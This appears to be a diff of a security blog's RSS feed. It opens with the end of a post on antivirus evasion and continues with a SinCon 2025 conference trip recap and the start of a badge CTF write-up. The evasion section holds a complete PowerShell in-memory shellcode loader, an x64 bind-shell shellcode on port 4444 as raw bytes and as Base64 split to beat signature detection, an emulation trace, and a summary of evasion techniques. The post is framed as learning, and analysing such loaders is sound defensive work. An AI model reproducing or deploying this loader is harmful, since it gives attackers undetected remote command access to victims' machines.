+        $asr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll CreateThread), (vXZ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$dQUM,[IntPtr]::Zero,0,[IntPtr]::Zero)
+        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll WaitForSingleObject), (vXZ @([IntPtr], [Int32]))).Invoke($asr,0xffffffff) | Out-Null
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/evasiondecrypttwo.n9tT9nDR_1W0kmk.webp&quot; alt=&quot;Second layer script analysis with shellcode loading&quot;&gt;
+&lt;em&gt;Analysis of the second-stage PowerShell script, showing shellcode loading and execution.&lt;/em&gt;&lt;/p&gt;
+&lt;h3&gt;Shellcode Analysis&lt;/h3&gt;
+&lt;p&gt;The final payload is the shellcode. Analysis of this shellcode reveals its purpose, which is typically to establish a command and control (C2) channel or deploy further malware.&lt;/p&gt;
+&lt;p&gt;Raw shellcode (partial view):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 52 51 56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52 20 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 48 31 c0 ac 3c 61 7c 02 2c 20 41 c1 c9 0d 41 01 c1 e2 ed 52 41 51 48 8b 52 20 8b 42 3c 48 01 d0 8b 80 88 00 00 00 48 85 c0 74 67 48 01 d0 50 8b 48 18 44 8b 40 20 49 01 d0 e3 56 48 ff c9 41 8b 34 88 48 01 d6 4d 31 c9 48 31 c0 ac 41 c1 c9 0d 41 01 c1 38 e0 75 f1 4c 03 4c 24 08 45 39 d1 75 d8 58 44 8b 40 24 49 01 d0 66 41 8b 0c 48 44 8b 40 1c 49 01 d0 41 8b 04 88 48 01 d0 41 58 41 58 5e 59 5a 41 58 41 59 41 5a 48 83 ec 20 41 52 ff e0 58 41 59 5a 48 8b 12 e9 57 ff ff ff 5d 49 be 77 73 32 5f 33 32 00 00 41 56 49 89 e6 48 81 ec a0 01 00 00 49 89 e5 49 bc 02 00 11 5c 00 00 00 00 41 54 49 89 e4 4c 89 f1 41 ba 4c 77 26 07 ff d5 4c 89 ea 68 01 01 00 00 59 41 ba 29 80 6b 00 ff d5 50 50 4d 31 c9 4d 31 c0 48 ff c0 48 89 c2 48 ff c0 48 89 c1 41 ba ea 0f df e0 ff d5 48 89 c7 6a 10 41 58 4c 89 e2 48 89 f9 41 ba c2 db 37 67 ff d5 48 31 d2 48 89 f9 41 ba b7 e9 38 ff ff d5 4d 31 c0 48 31 d2 48 89 f9 41 ba 74 ec 3b e1 ff d5 48 89 f9 48 89 c7 41 ba 75 6e 4d 61 ff d5 48 81 c4 a0 02 00 00 49 b8 63 6d 64 00 00 00 00 00 41 50 41 50 48 89 e2 57 57 57 4d 31 c0 6a 0d 59 41 50 e2 fc 66 c7 44 24 54 01 01 48 8d 44 24 18 c6 00 68 48 89 e6 56 50 41 50 41 50 41 50 49 ff c0 41 50 49 ff c8 4d 89 c1 4c 89 c1 41 ba 79 cc 3f 86 ff d5 48 31 d2 48 ff ca 8b 0e 41 ba 08 87 1d 60 ff d5 bb f0 b5 a2 56 41 ba a6 95 bd 9d ff d5 48 83 c4 28 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 59 41 89 da ff d5
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Emulation with tools like &lt;code&gt;speakeasy&lt;/code&gt; can reveal its behavior:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;speakeasy -t shellcode.bin  -r -a x64 
+* exec: shellcode
+0x10fe: &apos;kernel32.LoadLibraryA(&quot;ws2_32&quot;)&apos; -&gt; 0x78c00000
+0x110f: &apos;ws2_32.WSAStartup(0x101, 0x1203e08)&apos; -&gt; 0x0
+0x112b: &apos;ws2_32.WSASocketA(&quot;AF_INET&quot;, &quot;SOCK_STREAM&quot;, 0x0, 0x0, 0x0, 0x0)&apos; -&gt; 0x4
+0x1140: &apos;ws2_32.bind(0x4, &quot;0.0.0.0:4444&quot;, 0x10)&apos; -&gt; 0x0
+0x114e: &apos;ws2_32.listen(0x4, 0x0)&apos; -&gt; 0x0
+0x115f: &apos;ws2_32.accept(0x4, 0x0, 0x0)&apos; -&gt; 0x8
+0x116d: &apos;ws2_32.closesocket(0x4)&apos; -&gt; 0x0
+0x11c2: &apos;kernel32.CreateProcessA(0x0, &quot;cmd&quot;, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1203f38, 0x1203f20)&apos; -&gt; 0x1
+0x11d2: &apos;kernel32.WaitForSingleObject(0x220, 0xffffffffffffffff)&apos; -&gt; 0x0
+0x11df: &apos;kernel32.GetVersion()&apos; -&gt; 0x1db10106
+0x11f9: &apos;kernel32.ExitProcess(0x0)&apos; -&gt; 0x0
+* Finished emulating
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Summary of Shellcode Behavior:&lt;/strong&gt;
+The shellcode executes the following actions:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Loads &lt;code&gt;ws2_32.dll&lt;/code&gt; (Windows Sockets API).&lt;/li&gt;
+&lt;li&gt;Initializes Winsock.&lt;/li&gt;
+&lt;li&gt;Creates a TCP socket.&lt;/li&gt;
+&lt;li&gt;Binds the socket to listen on all available network interfaces on port 4444.&lt;/li&gt;
+&lt;li&gt;Accepts an incoming connection on this port.&lt;/li&gt;
+&lt;li&gt;Closes the original listening socket.&lt;/li&gt;
+&lt;li&gt;Creates a new &lt;code&gt;cmd.exe&lt;/code&gt; process, effectively providing a command prompt.&lt;/li&gt;
+&lt;li&gt;Waits for the &lt;code&gt;cmd.exe&lt;/code&gt; process to terminate.&lt;/li&gt;
+&lt;li&gt;Retrieves the operating system version (likely for telemetry or compatibility checks).&lt;/li&gt;
+&lt;li&gt;Exits the current process.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In essence, this shellcode implements a bind shell: it listens on port 4444 and provides an interactive command prompt to any client that connects to it.&lt;/p&gt;
+&lt;h3&gt;Further Evasion: Splitting the Payload&lt;/h3&gt;
+&lt;p&gt;To make signature-based detection more difficult, the Base64 encoded shellcode within the PowerShell script can be split into multiple string variables. These variables are then concatenated at runtime before the shellcode is decoded and executed.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;function paE {
+        Param ($jJ5, $a_TA6)
+        $pRE8k = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&apos;\&apos;)[-1].Equals(&apos;System.dll&apos;) }).GetType(&apos;Microsoft.Win32.UnsafeNativeMethods&apos;)
+
+        return $pRE8k.GetMethod(&apos;GetProcAddress&apos;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($pRE8k.GetMethod(&apos;GetModuleHandle&apos;)).Invoke($null, @($jJ5)))), $a_TA6))
+}
+
+function vXZ {
+        Param (
+                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $cpn5o,
+                [Parameter(Position = 1)] [Type] $ycb = [Void]
+        )
+
+        $aGf = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&apos;ReflectedDelegate&apos;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&apos;InMemoryModule&apos;, $false).DefineType(&apos;MyDelegateType&apos;, &apos;Class, Public, Sealed, AnsiClass, AutoClass&apos;, [System.MulticastDelegate])
+        $aGf.DefineConstructor(&apos;RTSpecialName, HideBySig, Public&apos;, [System.Reflection.CallingConventions]::Standard, $cpn5o).SetImplementationFlags(&apos;Runtime, Managed&apos;)
+        $aGf.DefineMethod(&apos;Invoke&apos;, &apos;Public, HideBySig, NewSlot, Virtual&apos;, $ycb, $cpn5o).SetImplementationFlags(&apos;Runtime, Managed&apos;)
+
+        return $aGf.CreateType()
+}
+$evasionpayload = &quot;/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/&quot;
+$evasionpayload += &quot;4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcAAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//&quot;
+$evasionpayload += &quot;1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==&quot;
+[Byte[]]$sSYI = [System.Convert]::FromBase64String($evasionpayload)
+[Uint32]$f21aS = 0
+$dQUM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualAlloc), (vXZ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $sSYI.Length,0x3000, 0x04)
+
+[System.Runtime.InteropServices.Marshal]::Copy($sSYI, 0, $dQUM, $sSYI.length)
+if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualProtect), (vXZ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($dQUM, [Uint32]$sSYI.Length, 0x10, [Ref]$f21aS)) -eq $true) {
+        $asr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll CreateThread), (vXZ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$dQUM,[IntPtr]::Zero,0,[IntPtr]::Zero)
+        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll WaitForSingleObject), (vXZ @([IntPtr], [Int32]))).Invoke($asr,0xffffffff) | Out-Null
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Conclusion: Evasion Strategy&lt;/h3&gt;
+&lt;p&gt;The PowerShell payload uses a sophisticated, multi-stage strategy to evade detection:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Initial Obfuscation&lt;/strong&gt;: The attack starts with a Base64 encoded command, hiding the initial script from simple static analysis and casual inspection.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Layered Deobfuscation&lt;/strong&gt;: The first-stage script downloads and deobfuscates a second-stage script (using Gzip and Base64 encoding), delaying the exposure of the core malicious logic.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;In-Memory Operations&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Both the second-stage script and the final shellcode are executed entirely in memory. This bypasses AV scanners that primarily focus on detecting malicious files on the disk.&lt;/li&gt;
+&lt;li&gt;Dynamic API resolution and in-memory .NET assembly compilation make it harder for AV systems to detect malicious P/Invoke calls through static analysis of import tables.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Shellcode Obfuscation&lt;/strong&gt;: Storing the shellcode as a Base64 string (and potentially splitting it across multiple variables) helps to hide it from basic signature-based detection methods.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;These combined techniques significantly improve the payload&apos;s ability to evade detection by traditional Antivirus solutions.&lt;/p&gt;</content:encoded><h:img src="/_astro/banner.CqCGtCuP.jpg"/><enclosure url="/_astro/banner.CqCGtCuP.jpg"/></item><item><title>My Trip to SinCon2025</title><link>https://gr1d-init.github.io/blog/sincon2025</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/sincon2025</guid><description>A recap of my trip to SinCon 2025, experiences throughout the workshop</description><pubDate>Sat, 24 May 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Attending &lt;strong&gt;SinCon 2025&lt;/strong&gt; was a valuable experience, filled with learning opportunities, networking, and interesting challenges at &quot;kampungs&quot;. This blog will provide a rundown of the event.&lt;/p&gt;
+&lt;h2&gt;The Journey to SinCon&lt;/h2&gt;
+&lt;p&gt;The &lt;strong&gt;UTM curfew&lt;/strong&gt; (12 AM to 6 AM) meant I had to start my journey at a specific time. I took the &lt;strong&gt;P211 bus&lt;/strong&gt; from UTM to Larkin around 9 PM, followed by the &lt;strong&gt;P101&lt;/strong&gt; to JB Central. Fortunately, both of these bus rides were &lt;strong&gt;free of charge&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Before crossing the border, I took care of a couple of essentials: activating an &lt;strong&gt;international data roaming plan&lt;/strong&gt; (RM30) and reporting my stay in Singapore via the &lt;strong&gt;MyICA app&lt;/strong&gt;, which is linked to my passport.&lt;/p&gt;
+&lt;p&gt;From JB Central, I walked to the CIQ. After a passport scan, and then another, I proceeded to choose a bus. As my destination was Queen St, I boarded the &lt;strong&gt;CW2&lt;/strong&gt;. Being my first time crossing the border without an &lt;strong&gt;EZLink card&lt;/strong&gt;, I used my debit card for the bus fare. A quick wave of the card at JB CIQ, and I was on my way.&lt;/p&gt;
+&lt;p&gt;The ride from JB CIQ to &lt;strong&gt;Woodlands Checkpoint&lt;/strong&gt; was approximately 5 minutes. It was not necessary to tap out with the debit card when arriving there. I scanned my passport at Woodlands, then re-boarded the &lt;strong&gt;CW2&lt;/strong&gt; (tapping my debit card again). The bus then continued to &lt;strong&gt;Queen St Terminal&lt;/strong&gt;. Again, no tap-out was required upon arrival.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/pic1.CffHiAKW_Z2rv6AM.webp&quot; alt=&quot;Journey to SinCon&quot;&gt;&lt;/p&gt;
+&lt;p&gt;I spent my first night in Singapore at a &lt;strong&gt;McDonald&apos;s&lt;/strong&gt; near Queen St Terminal, thanks to their &lt;strong&gt;complimentary Wi-Fi&lt;/strong&gt;. There, I had an iced latte and configured my virtual machines and other necessary software for the upcoming SinCon workshops.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/pic2.I3NFo6qR_1Qn7In.webp&quot; alt=&quot;My &amp;#x22;command center&amp;#x22; at McDonald&amp;#x27;s&quot;&gt;&lt;/p&gt;
+&lt;p&gt;Early of the next morning, I went to the nearest MRT station by Queen St and purchased an &lt;strong&gt;EZLink card&lt;/strong&gt;. The cost was &lt;strong&gt;10 SGD&lt;/strong&gt; (5 SGD for the card itself and 5 SGD in stored credit).&lt;br&gt;
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/ezlink.CTTgMY48_Z2qbf4B.webp&quot; alt=&quot;My EZLink Card&quot;&gt;&lt;/p&gt;
+&lt;h2&gt;SinCon Day 1: Workshops and First Impressions&lt;/h2&gt;
+&lt;p&gt;Upon arrival at &lt;strong&gt;Voco Orchard&lt;/strong&gt;, the SinCon venue,&lt;/p&gt;
+&lt;p&gt;At registration desk, I received my pass and some conference souvenirs. Breakfast was provided, which was a welcome addition. Following that, we attended &lt;strong&gt;two keynote sessions&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/pic3.BwbNDE1N_OoNEL.webp&quot; alt=&quot;Voco Orchard - SinCon Venue&quot;&gt;&lt;/p&gt;
+&lt;p&gt;Around 11 AM, as workshops were still being set up, I visited the &lt;strong&gt;AI Kampung&lt;/strong&gt;. The moderator presented an impressive demonstration of using &lt;strong&gt;Copilot with Gemini 2.5 and Augment&lt;/strong&gt; for rapid application development.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/aikampung.AEuzoETG_1sARie.webp&quot; alt=&quot;AI Kampung Demonstration&quot;&gt;&lt;/p&gt;
+&lt;p&gt;The demonstration highlighted how these tools could significantly impact the development of &lt;strong&gt;red and blue team tools&lt;/strong&gt; in cybersecurity, bringing an evolution to the industry.&lt;/p&gt;
+&lt;p&gt;My first workshop was &lt;strong&gt;Shellshock&lt;/strong&gt;, which proved to be quite insightful.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;For more details, refer to:&lt;br&gt;
+https://gr1d-init.github.io/blog/sinconshellshock/&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/shellshock.BDu1TbRz_ZUVRb3.webp&quot; alt=&quot;Shellshock Workshop&quot;&gt;&lt;/p&gt;
+&lt;p&gt;In between sessions, I visited the &lt;strong&gt;Electronic Badge Kampung&lt;/strong&gt; and had my &lt;strong&gt;Dragon Badge&lt;/strong&gt; soldered. It looked impressive.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/dragon.BMsnVge1_Z299dvk.webp&quot; alt=&quot;My freshly soldered Dragon Badge&quot;&gt;&lt;/p&gt;
+&lt;p&gt;After lunch, I attended the &lt;strong&gt;Windbg workshop&lt;/strong&gt;. This session provided a solid introduction to the &lt;strong&gt;dynamic analysis of Windows binaries&lt;/strong&gt;.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/windbg.C3AhDAN4_2kEiF1.webp&quot; alt=&quot;Windbg Workshop&quot;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Further information can be found here:&lt;br&gt;
+https://gr1d-init.github.io/blog/sinconwindbg/&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This concluded the first day of the conference.&lt;/p&gt;
+&lt;h2&gt;Evening Activities and CTF Engagement&lt;/h2&gt;
+&lt;p&gt;I traveled by bus to my accommodation, using my new &lt;strong&gt;EZLink card&lt;/strong&gt; for payment. That evening, feeling quite overwhelmed, I nevertheless dedicated some time to the &lt;strong&gt;Dragon Badge CTF challenges&lt;/strong&gt;.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/accomodation.DEWkNVvR_ZviEf0.webp&quot; alt=&quot;accomodation&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./assets/sincondragon.webp&quot; alt=&quot;Dragon Badge CTF&quot;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;My writeups for these challenges are available at:&lt;br&gt;
+https://gr1d-init.github.io/blog/sincondragonbadge/&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;SinCon Day 2: Hardware Hacking and Discoveries&lt;/h2&gt;
+&lt;p&gt;The following morning, I returned to &lt;strong&gt;Voco Orchard&lt;/strong&gt; for the second day of SinCon. After breakfast, I immersed myself in what became my favorite part of the conference: the &lt;strong&gt;Hardware Hacking Kampung&lt;/strong&gt;, hosted by the &lt;strong&gt;bi0sctf team&lt;/strong&gt;. Their team members were approachable, willing to teach, and I gained significant insights into hardware hacking. It was, in my opinion, the most engaging kampung.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/bi0s.DEMZ-dyN_1zE9Cd.webp&quot; alt=&quot;bi0s&quot;&gt;&lt;/p&gt;
+&lt;p&gt;I also participated in their &lt;strong&gt;hardware CTF&lt;/strong&gt; and was pleased to win a &lt;strong&gt;CompatrIoT board&lt;/strong&gt;. Look how sophisticated it is.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/compatriot.DQdRmBpe_PVpr0.webp&quot; alt=&quot;compatriot&quot;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;My writeup for this CTF:&lt;br&gt;
+https://gr1d-init.github.io/blog/sinconhardwarekampung/&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;After the hardware CTF, I visited the &lt;strong&gt;RFID Kampung&lt;/strong&gt;. There, I received an introduction to &lt;strong&gt;BadUSB&lt;/strong&gt; (casually referred to as &quot;bad mouse&quot;) and other RFID-related topics.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/rfid.D45sQknN_Z1IHkEA.webp&quot; alt=&quot;rfid&quot;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;More information on this can be found at:&lt;br&gt;
+https://gr1d-init.github.io/blog/sinconrfidkampung/&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I also stopped by the &lt;strong&gt;Cyber Range Village&lt;/strong&gt;, which featured &lt;strong&gt;pentest-style Active Directory CTFs&lt;/strong&gt;.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/cyberrange.DvT9-f9T_EpMCm.webp&quot; alt=&quot;cyberrange&quot;&gt;&lt;br&gt;
+I joined their community at &lt;code&gt;rangevillage.org&lt;/code&gt; and discovered additional CTFs on &lt;code&gt;playtrv.async.sg&lt;/code&gt;. Unfortunately, due to time constraints, I was unable to attend their AD workshop, but it is an area I intend to explore further.&lt;/p&gt;
+&lt;p&gt;And with that, &lt;strong&gt;SinCon 2025 concluded&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2&gt;AfterCon: Exploring Singapore&lt;/h2&gt;
+&lt;p&gt;With the conference finished, I took some time for sightseeing. I headed to &lt;strong&gt;Marina Bay&lt;/strong&gt; and saw the &lt;strong&gt;Marina Bay Sands&lt;/strong&gt;. I also had a view of the &lt;strong&gt;Merlion statue&lt;/strong&gt; across the water. My visit included &lt;strong&gt;Gardens by the Bay&lt;/strong&gt;, where I saw the iconic &lt;strong&gt;Supertree Grove&lt;/strong&gt;.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/pic4.Cq0hRUHJ_2eTckq.webp&quot; alt=&quot;Marina Bay Sands&quot;&gt;&lt;/p&gt;
+&lt;p&gt;It was then time to begin my journey back. I took the &lt;strong&gt;CW2 bus&lt;/strong&gt; from Queen St Terminal. This time, scanning my EZLink card produced a &lt;strong&gt;yellow ticket&lt;/strong&gt;.
+&lt;img src=&quot;https://gr1d-init.github.io/_astro/cw2.DZNDnlfm_ZR8Cl3.webp&quot; alt=&quot;cw2&quot;&gt;&lt;/p&gt;
+&lt;p&gt;The return journey mirrored my arrival: &lt;strong&gt;Woodlands Checkpoint&lt;/strong&gt; (passport scan), re-boarded &lt;strong&gt;CW2&lt;/strong&gt;, reached &lt;strong&gt;JB CIQ&lt;/strong&gt; (another passport scan), then another &lt;strong&gt;CW2&lt;/strong&gt; ride to Larkin. From Larkin, the free &lt;strong&gt;P211 bus&lt;/strong&gt; transported me back to UTM, concluding my trip safely.&lt;/p&gt;
+&lt;h2&gt;Overall Experience and Reflections&lt;/h2&gt;
+&lt;p&gt;Beyond the formal workshops and talks, SinCon provided an excellent opportunity to connect with fellow &lt;strong&gt;cybersecurity enthusiasts&lt;/strong&gt; and join new communities. It was a highly positive experience overall, with the &lt;strong&gt;hardware hacking session&lt;/strong&gt; led by the &lt;strong&gt;bi0sctf team&lt;/strong&gt; being a particular highlight.&lt;/p&gt;
+&lt;h2&gt;Acknowledgements&lt;/h2&gt;
+&lt;p&gt;I extend my sincere gratitude to &lt;strong&gt;InfoSec in the City&lt;/strong&gt; for selecting me for the &lt;strong&gt;SinCon 2025 student scholarship&lt;/strong&gt;. I also offer massive thanks to the &lt;strong&gt;bi0sctf team&lt;/strong&gt; for their hardware hacking session, all the &lt;strong&gt;speakers&lt;/strong&gt; for their insightful workshops, the &lt;strong&gt;event crews&lt;/strong&gt; for their hard work in ensuring the event ran smoothly, and &lt;strong&gt;everyone I had the pleasure of meeting&lt;/strong&gt;. I learned a great deal from these interactions.&lt;/p&gt;
+&lt;h2&gt;Budget Breakdown (Approximate)&lt;/h2&gt;
+&lt;p&gt;Here is an estimated breakdown of my expenses. All SGD amounts have been converted to MYR using an approximate exchange rate of &lt;strong&gt;1 SGD ≈ 3.29 MYR&lt;/strong&gt; (based on rate from xe.com, May 27, 2025).&lt;/p&gt;
+&lt;p&gt;| Item                                      | Cost (SGD) | Cost (MYR) |
+| :---------------------------------------- | :---------: | :---------: |
+| Accommodation                             |     -      |   130.00   |
+| International Data Roaming                |     -      |    30.00   |
+| EZLink Card Purchase (Fee)                |    5.00    |    16.46   |
+| EZLink Card Purchase (Initial Credit)     |    5.00    |    16.46   |
+| Transport (Singapore - EZLink top-ups)    |   10.00    |    32.92   |
+| Transport (Malaysia - buses)              |     -      |     4.80   |
+| Food &amp;#x26; Drinks (McDonald&apos;s Iced Latte)     |    1.00    |     3.29   |
+| &lt;strong&gt;Total&lt;/strong&gt;                                 |  &lt;strong&gt;21.00&lt;/strong&gt; |  &lt;strong&gt;233.93&lt;/strong&gt; |&lt;/p&gt;
+&lt;p&gt;In summary, it was an &lt;strong&gt;enriching and insightful trip&lt;/strong&gt;. I look forward to future adventures among the communities.&lt;/p&gt;</content:encoded><h:img src="/_astro/banner.CXu4Y5GZ.avif"/><enclosure url="/_astro/banner.CXu4Y5GZ.avif"/></item><item><title>The SinCon 2025 Dragon Badge</title><link>https://gr1d-init.github.io/blog/sincondragonbadge</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/sincondragonbadge</guid><description>Writeups for SinCon Dragon Badge Challenges</description><pubDate>Sat, 24 May 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;SinCon 2025&apos;s hardware badge reimagines Singapore&apos;s iconic Dragon Playground as an interactive CTF challenge. This nostalgic tribute to the Dragon Playground at Toa Payoh, Singapore.
 &lt;img src=&quot;https://gr1d-init.github.io/_astro/playground.BB1FvR60_CeBrT.webp&quot; alt=&quot;Dragon Playground&quot;&gt;&lt;/p&gt;
 &lt;h2&gt;Getting Started&lt;/h2&gt;
 &lt;h3&gt;Badge Assembly&lt;/h3&gt;
